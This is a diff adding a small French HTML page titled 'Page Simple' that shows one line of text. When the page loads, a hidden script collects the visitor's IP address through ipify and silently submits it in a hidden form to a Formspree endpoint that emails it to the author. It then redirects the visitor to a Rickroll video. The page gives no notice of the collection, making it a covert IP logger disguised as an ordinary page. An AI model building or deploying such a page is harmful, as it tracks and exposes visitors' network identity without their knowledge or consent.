@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Page Simple</title>
+  <script>
+    // Fonction pour obtenir l'IP de l'utilisateur via l'API ipify
+    function getIp() {
+      fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+          // Appeler la fonction pour envoyer l'IP à Formspree
+          sendIpToFormspree(data.ip);
+        })
+        .catch(error => console.error('Erreur:', error));
+    }
+
+    // Fonction pour envoyer l'IP à Formspree via un formulaire
+    function sendIpToFormspree(ip) {
+      const form = document.createElement('form');
+      form.method = 'POST';
+      form.action = 'https://formspree.io/f/xlddkrng'; // Lien Formspree modifié
+
+      const inputEmail = document.createElement('input');
+      inputEmail.type = 'hidden';
+      inputEmail.name = '_replyto';
+      inputEmail.value = 'sashadp18@hotmail.com'; // Votre adresse e-mail
+      form.appendChild(inputEmail);
+
+      const inputIp = document.createElement('input');
+      inputIp.type = 'hidden';
+      inputIp.name = 'ip';
+      inputIp.value = ip;
+      form.appendChild(inputIp);
+
+      document.body.appendChild(form);
+      form.submit();
+
+      // Retarder la redirection vers YouTube pour s'assurer que le formulaire est envoyé
+      setTimeout(function() {
+        window.location.href = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ';
+      }, 2000); // Attendre 2 secondes avant de rediriger
+    }
+
+    // Appel automatique de la fonction pour récupérer l'IP lorsque la page est chargée
+    window.onload = function() {
+      getIp();
+    }
+  </script>
+</head>
+<body>
+  <h1>che po en vrai</h1>
+</body>
+</html>
